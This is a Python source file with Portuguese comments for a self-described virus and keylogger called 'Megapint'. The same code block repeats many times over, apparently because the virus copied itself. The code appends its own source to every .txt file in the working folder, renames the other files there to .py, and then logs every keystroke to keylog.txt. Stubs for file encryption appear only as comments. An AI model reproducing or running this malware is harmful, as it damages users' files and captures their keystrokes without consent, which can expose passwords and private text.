    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

